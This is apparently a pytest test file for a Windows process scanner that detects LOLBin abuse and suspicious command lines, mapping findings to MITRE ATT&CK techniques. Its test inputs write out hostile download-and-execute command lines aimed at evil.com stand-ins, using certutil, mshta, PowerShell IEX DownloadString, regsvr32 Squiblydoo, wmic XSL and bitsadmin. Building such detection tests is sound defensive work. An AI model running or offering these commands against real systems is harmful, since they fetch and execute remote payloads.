"""
test_process_cmdline.py - Tests for process scanner command-line analysis.

Tests LOLBin abuse detection (CHECK 4) and general suspicious
command-line pattern matching (CHECK 5) introduced in Sprint 1.2.
"""

import os
import sys
import pytest

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from scanner_core.models import Finding, RiskLevel
from scanners.process_scanner import (
    _check_lolbin_cmdline,
    _check_general_cmdline,
    _get_cmdline,
    LOLBIN_PATTERNS,
    LOLBIN_NAMES,
    GENERAL_SUSPICIOUS_CMDLINE,
)


# ---------------------------------------------------------------------------
# Helper: build a minimal process info dict for tests
# ---------------------------------------------------------------------------

def _proc(name: str = "test.exe", exe: str = "C:\\test.exe", pid: int = 1234) -> dict:
    return {"name": name, "exe": exe, "pid": pid, "ppid": 0}


# ===========================================================================
# LOLBin Pattern Matching Tests
# ===========================================================================

class TestCertutilPatterns:
    """Certutil LOLBin detection tests."""

    def test_urlcache_detected(self):
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
            _proc("certutil.exe", "C:\\Windows\\System32\\certutil.exe"),
        )
        assert len(findings) >= 1
        assert any("URL cache" in f.title for f in findings)
        assert any(f.mitre_id == "T1105" for f in findings)

    def test_decode_detected(self):
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -decode encoded.txt payload.exe",
            _proc("certutil.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1140" for f in findings)

    def test_encode_detected(self):
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -encode payload.exe encoded.txt",
            _proc("certutil.exe"),
        )
        assert len(findings) >= 1
        assert any("encode" in f.title.lower() for f in findings)

    def test_hashfile_clean(self):
        """certutil -hashfile is normal usage — should NOT trigger."""
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -hashfile somefile.exe SHA256",
            _proc("certutil.exe"),
        )
        assert len(findings) == 0

    def test_verify_clean(self):
        """certutil -verify is normal usage."""
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -verify certificate.cer",
            _proc("certutil.exe"),
        )
        assert len(findings) == 0


class TestMshtaPatterns:
    """MSHTA LOLBin detection tests."""

    def test_javascript_detected(self):
        findings = _check_lolbin_cmdline(
            "mshta.exe",
            'mshta javascript:a=GetObject("script:http://evil.com/payload")',
            _proc("mshta.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1218.005" for f in findings)

    def test_vbscript_detected(self):
        findings = _check_lolbin_cmdline(
            "mshta.exe",
            "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")\")",
            _proc("mshta.exe"),
        )
        assert len(findings) >= 1
        assert any("vbscript" in f.title.lower() for f in findings)

    def test_remote_hta_detected(self):
        findings = _check_lolbin_cmdline(
            "mshta.exe",
            "mshta http://evil.com/malicious.hta",
            _proc("mshta.exe"),
        )
        assert len(findings) >= 1

    def test_local_hta_clean(self):
        """Local HTA file without script protocol should be clean."""
        findings = _check_lolbin_cmdline(
            "mshta.exe",
            "mshta C:\\Users\\admin\\report.hta",
            _proc("mshta.exe"),
        )
        assert len(findings) == 0


class TestPowershellPatterns:
    """PowerShell LOLBin detection tests."""

    def test_encoded_command_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            _proc("powershell.exe"),
        )
        assert len(findings) >= 1
        titles = " ".join(f.title for f in findings)
        assert "Encoded" in titles

    def test_hidden_window_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe -w hidden -command Get-Process",
            _proc("powershell.exe"),
        )
        assert len(findings) >= 1
        assert any("Hidden" in f.title or "hidden" in f.title for f in findings)

    def test_iex_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com')",
            _proc("powershell.exe"),
        )
        assert len(findings) >= 2  # IEX + downloadstring
        mitre_ids = {f.mitre_id for f in findings}
        assert "T1059.001" in mitre_ids

    def test_nop_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe -nop -w hidden -enc AAAA",
            _proc("powershell.exe"),
        )
        nop_findings = [f for f in findings if "no-profile" in f.title.lower()]
        assert len(nop_findings) >= 1

    def test_nop_does_not_match_noprofile_flag(self):
        """The \\b-nop\\b pattern should match -nop but also -noprofile via the second branch."""
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe -NoProfile -File C:\\scripts\\backup.ps1",
            _proc("powershell.exe"),
        )
        # -NoProfile matches -noprofile pattern (which is intentional —
        # even the full flag is suspicious in automated contexts)
        nop_findings = [f for f in findings if "no-profile" in f.title.lower()]
        assert len(nop_findings) >= 1

    def test_downloadstring_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell (New-Object Net.WebClient).DownloadString('http://x.com/a')",
            _proc("powershell.exe"),
        )
        assert any("download" in f.title.lower() for f in findings)

    def test_frombase64string_detected(self):
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell [System.Convert]::FromBase64String('AAAA')",
            _proc("powershell.exe"),
        )
        assert any("Base64" in f.title for f in findings)

    def test_large_encoded_payload_detected(self):
        payload = "A" * 50  # 50 chars of base64-like
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            f"powershell.exe -e {payload}",
            _proc("powershell.exe"),
        )
        assert any("Large encoded" in f.title for f in findings)

    def test_simple_script_clean(self):
        """Normal script execution without suspicious flags."""
        findings = _check_lolbin_cmdline(
            "powershell.exe",
            "powershell.exe -File C:\\scripts\\backup.ps1",
            _proc("powershell.exe"),
        )
        # Should not have HIGH findings for just running a script
        high_findings = [f for f in findings if f.risk == RiskLevel.HIGH]
        assert len(high_findings) == 0

    def test_combined_malicious_cmdline(self):
        """Multiple suspicious flags combined — should produce multiple findings."""
        cmdline = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA"
        findings = _check_lolbin_cmdline(
            "powershell.exe", cmdline,
            _proc("powershell.exe"),
        )
        # Should detect: -enc, -w hidden, -nop, and large encoded payload
        assert len(findings) >= 3


class TestCmdPatterns:
    """CMD LOLBin detection tests."""

    def test_spawning_powershell_detected(self):
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe /c powershell -enc AAAA",
            _proc("cmd.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1059.003" for f in findings)

    def test_spawning_certutil_detected(self):
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe /c certutil -urlcache -f http://x.com/a",
            _proc("cmd.exe"),
        )
        assert len(findings) >= 1

    def test_spawning_mshta_detected(self):
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe /c mshta http://evil.com/payload.hta",
            _proc("cmd.exe"),
        )
        assert len(findings) >= 1

    def test_pipe_chain_detected(self):
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe /c echo payload | powershell",
            _proc("cmd.exe"),
        )
        # Should match both pipe chain AND spawning interpreter
        assert len(findings) >= 1

    def test_simple_dir_clean(self):
        """cmd /c dir is normal usage."""
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe /c dir C:\\Users",
            _proc("cmd.exe"),
        )
        assert len(findings) == 0

    def test_no_slash_c_clean(self):
        """cmd without /c running normally."""
        findings = _check_lolbin_cmdline(
            "cmd.exe",
            "cmd.exe",
            _proc("cmd.exe"),
        )
        assert len(findings) == 0


class TestRegsvr32Patterns:
    """Regsvr32 LOLBin detection tests."""

    def test_squiblydoo_detected(self):
        findings = _check_lolbin_cmdline(
            "regsvr32.exe",
            "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll",
            _proc("regsvr32.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1218.010" for f in findings)

    def test_scrobj_detected(self):
        findings = _check_lolbin_cmdline(
            "regsvr32.exe",
            "regsvr32 /s /i:file.sct scrobj.dll",
            _proc("regsvr32.exe"),
        )
        assert len(findings) >= 1
        assert any("scriptlet" in f.details["pattern_matched"].lower() for f in findings)

    def test_normal_registration_clean(self):
        """Normal DLL registration should not trigger."""
        findings = _check_lolbin_cmdline(
            "regsvr32.exe",
            "regsvr32 C:\\Windows\\System32\\msxml6.dll",
            _proc("regsvr32.exe"),
        )
        assert len(findings) == 0


class TestRundll32Patterns:
    """Rundll32 LOLBin detection tests."""

    def test_javascript_detected(self):
        findings = _check_lolbin_cmdline(
            "rundll32.exe",
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
            _proc("rundll32.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1218.011" for f in findings)

    def test_suspicious_path_detected(self):
        findings = _check_lolbin_cmdline(
            "rundll32.exe",
            "rundll32.exe C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.dll,DllMain",
            _proc("rundll32.exe"),
        )
        assert len(findings) >= 1

    def test_shell32_ordinal_detected(self):
        findings = _check_lolbin_cmdline(
            "rundll32.exe",
            "rundll32.exe shell32.dll,#61",
            _proc("rundll32.exe"),
        )
        assert len(findings) >= 1

    def test_normal_dll_clean(self):
        """Normal system DLL loading should not trigger."""
        findings = _check_lolbin_cmdline(
            "rundll32.exe",
            "rundll32.exe printui.dll,PrintUIEntry /ia /m",
            _proc("rundll32.exe"),
        )
        assert len(findings) == 0


class TestWmicPatterns:
    """WMIC LOLBin detection tests."""

    def test_process_create_detected(self):
        findings = _check_lolbin_cmdline(
            "wmic.exe",
            "wmic process call create calc.exe",
            _proc("wmic.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1047" for f in findings)

    def test_xsl_execution_detected(self):
        findings = _check_lolbin_cmdline(
            "wmic.exe",
            'wmic os get /format:"https://evil.com/payload.xsl"',
            _proc("wmic.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1220" for f in findings)

    def test_normal_query_clean(self):
        """Normal WMIC query should not trigger."""
        findings = _check_lolbin_cmdline(
            "wmic.exe",
            "wmic os get caption,version",
            _proc("wmic.exe"),
        )
        assert len(findings) == 0


class TestBitsadminPatterns:
    """BitsAdmin LOLBin detection tests."""

    def test_transfer_detected(self):
        findings = _check_lolbin_cmdline(
            "bitsadmin.exe",
            "bitsadmin /transfer myJob http://evil.com/mal.exe C:\\temp\\mal.exe",
            _proc("bitsadmin.exe"),
        )
        assert len(findings) >= 1
        assert any(f.mitre_id == "T1197" for f in findings)

    def test_list_clean(self):
        """bitsadmin /list is normal usage."""
        findings = _check_lolbin_cmdline(
            "bitsadmin.exe",
            "bitsadmin /list",
            _proc("bitsadmin.exe"),
        )
        assert len(findings) == 0


# ===========================================================================
# General Suspicious Command-Line Tests
# ===========================================================================

class TestGeneralCmdlinePatterns:
    """Tests for general suspicious command-line detection (CHECK 5)."""

    def test_long_base64_detected(self):
        payload = "A" * 120
        findings = _check_general_cmdline(
            f"unknown.exe {payload}",
            _proc("unknown.exe"),
        )
        assert len(findings) >= 1
        assert any("Base64" in f.title for f in findings)

    def test_short_base64_not_flagged(self):
        """Base64-like strings under 100 chars should NOT trigger."""
        payload = "A" * 50
        findings = _check_general_cmdline(
            f"app.exe {payload}",
            _proc("app.exe"),
        )
        assert not any("Base64" in f.title for f in findings)

    def test_url_detected(self):
        findings = _check_general_cmdline(
            "suspicious.exe http://evil.com/payload",
            _proc("suspicious.exe"),
        )
        assert len(findings) >= 1
        assert any("URL" in f.title for f in findings)

    def test_https_url_detected(self):
        findings = _check_general_cmdline(
            "suspicious.exe https://evil.com/payload",
            _proc("suspicious.exe"),
        )
        assert any("URL" in f.title for f in findings)

    def test_hidden_window_detected(self):
        findings = _check_general_cmdline(
            "malware.exe -windowstyle hidden",
            _proc("malware.exe"),
        )
        assert any("Hidden" in f.title or "hidden" in f.title for f in findings)

    def test_temp_execution_detected(self):
        findings = _check_general_cmdline(
            r"loader.exe C:\Users\test\AppData\Local\Temp\malware.exe",
            _proc("loader.exe"),
        )
        assert len(findings) >= 1
        assert any("Temp" in f.title for f in findings)

    def test_appdata_execution_detected(self):
        findings = _check_general_cmdline(
            r"loader.exe C:\Users\test\AppData\Roaming\evil.dll",
            _proc("loader.exe"),
        )
        assert len(findings) >= 1
        assert any("AppData" in f.title for f in findings)

    def test_clean_cmdline_no_findings(self):
        findings = _check_general_cmdline(
            "app.exe --config settings.json",
            _proc("app.exe"),
        )
        assert len(findings) == 0

    def test_normal_path_clean(self):
        """Normal program path should not trigger temp/appdata rules."""
        findings = _check_general_cmdline(
            "app.exe C:\\Program Files\\MyApp\\data.json",
            _proc("app.exe"),
        )
        assert len(findings) == 0


# ===========================================================================
# Non-LOLBin Name Returns Empty
# ===========================================================================

class TestNonLolbinReturnsEmpty:
    """Non-LOLBin binary names should return empty findings from LOLBin check."""

    def test_notepad_returns_empty(self):
        findings = _check_lolbin_cmdline(
            "notepad.exe",
            "notepad.exe C:\\test.txt",
            _proc("notepad.exe"),
        )
        assert findings == []

    def test_chrome_returns_empty(self):
        findings = _check_lolbin_cmdline(
            "chrome.exe",
            "chrome.exe http://example.com",
            _proc("chrome.exe"),
        )
        assert findings == []

    def test_random_exe_returns_empty(self):
        findings = _check_lolbin_cmdline(
            "myapp.exe",
            "myapp.exe -enc AAAA -urlcache",
            _proc("myapp.exe"),
        )
        assert findings == []


# ===========================================================================
# Finding Contract Tests
# ===========================================================================

class TestFindingContract:
    """Verify all findings conform to the Finding dataclass contract."""

    def test_lolbin_finding_required_fields(self):
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            "certutil -urlcache -f http://x.com/a C:\\a",
            _proc("certutil.exe", "C:\\Windows\\System32\\certutil.exe", 42),
        )
        for f in findings:
            assert f.module == "Process Scanner"
            assert isinstance(f.risk, RiskLevel)
            assert f.title
            assert f.description
            assert f.mitre_id
            assert "cmdline" in f.details
            assert "pid" in f.details
            assert "process" in f.details
            assert "pattern_matched" in f.details

    def test_general_finding_required_fields(self):
        findings = _check_general_cmdline(
            "x.exe http://evil.com",
            _proc("x.exe", "C:\\x.exe", 42),
        )
        for f in findings:
            assert f.module == "Process Scanner"
            assert isinstance(f.risk, RiskLevel)
            assert f.title
            assert f.description
            assert f.mitre_id
            assert "cmdline" in f.details

    def test_cmdline_truncated_in_details(self):
        """Cmdlines over 2000 chars should be truncated in details."""
        long_cmdline = "certutil -urlcache " + "A" * 3000
        findings = _check_lolbin_cmdline(
            "certutil.exe",
            long_cmdline,
            _proc("certutil.exe"),
        )
        assert len(findings) >= 1
        for f in findings:
            assert len(f.details["cmdline"]) <= 2000


# ===========================================================================
# Deduplication Tests
# ===========================================================================

class TestDeduplication:
    """Verify per-pattern deduplication within a single process."""

    def test_no_duplicate_descriptions_lolbin(self):
        """Same pattern should not produce duplicate findings."""
        cmdline = "powershell -enc AAAA -enc BBBB"
        findings = _check_lolbin_cmdline(
            "powershell.exe", cmdline,
            _proc("powershell.exe"),
        )
        descriptions = [f.details["pattern_matched"] for f in findings]
        assert len(descriptions) == len(set(descriptions))

    def test_no_duplicate_descriptions_general(self):
        """General patterns should also deduplicate."""
        cmdline = "app.exe http://evil.com http://evil2.com"
        findings = _check_general_cmdline(
            cmdline,
            _proc("app.exe"),
        )
        descriptions = [f.details["pattern_matched"] for f in findings]
        assert len(descriptions) == len(set(descriptions))


# ===========================================================================
# _get_cmdline Helper Tests
# ===========================================================================

class TestGetCmdline:
    """Tests for the _get_cmdline helper function."""

    def test_nonexistent_pid_returns_none(self):
        result = _get_cmdline(999999999)
        assert result is None

    @pytest.mark.skipif(sys.platform != "win32", reason="Windows-only")
    def test_current_process_returns_string(self):
        """Current process cmdline should be retrievable."""
        result = _get_cmdline(os.getpid())
        assert result is not None
        assert isinstance(result, str)
        assert len(result) > 0


# ===========================================================================
# Data Structure Integrity Tests
# ===========================================================================

class TestLolbinDataStructures:
    """Verify LOLBin pattern data structures are well-formed."""

    def test_lolbin_names_matches_patterns(self):
        """LOLBIN_NAMES set should exactly match LOLBIN_PATTERNS keys."""
        assert LOLBIN_NAMES == set(LOLBIN_PATTERNS.keys())

    def test_all_patterns_have_four_elements(self):
        """Every pattern tuple must have (regex, desc, risk, mitre_id)."""
        for bin_name, patterns in LOLBIN_PATTERNS.items():
            for i, p in enumerate(patterns):
                assert len(p) == 4, f"{bin_name} pattern {i} has {len(p)} elements"
                assert hasattr(p[0], "search"), f"{bin_name} pattern {i}[0] is not a compiled regex"
                assert isinstance(p[1], str), f"{bin_name} pattern {i}[1] is not a string"
                assert isinstance(p[2], RiskLevel), f"{bin_name} pattern {i}[2] is not RiskLevel"
                assert isinstance(p[3], str), f"{bin_name} pattern {i}[3] is not a string"
                assert p[3].startswith("T"), f"{bin_name} pattern {i}[3] MITRE ID doesn't start with T"

    def test_general_patterns_have_four_elements(self):
        """General patterns must also have (regex, desc, risk, mitre_id)."""
        for i, p in enumerate(GENERAL_SUSPICIOUS_CMDLINE):
            assert len(p) == 4, f"General pattern {i} has {len(p)} elements"
            assert hasattr(p[0], "search")
            assert isinstance(p[1], str)
            assert isinstance(p[2], RiskLevel)
            assert p[3].startswith("T")

    def test_expected_lolbin_binaries_present(self):
        """All 8 LOLBin binaries from the roadmap must be present."""
        expected = {"certutil", "mshta", "rundll32", "regsvr32",
                    "bitsadmin", "wmic", "powershell", "cmd"}
        assert expected == LOLBIN_NAMES


# ===========================================================================
# Integration Test (Windows-only)
# ===========================================================================

@pytest.mark.skipif(sys.platform != "win32", reason="Windows-only")
class TestProcessScannerIntegration:
    """Integration test: full scan() returns valid findings list."""

    def test_scan_returns_list_of_findings(self):
        from scanners.process_scanner import scan
        results = scan()
        assert isinstance(results, list)
        for f in results:
            assert isinstance(f, Finding)
            assert f.module == "Process Scanner"
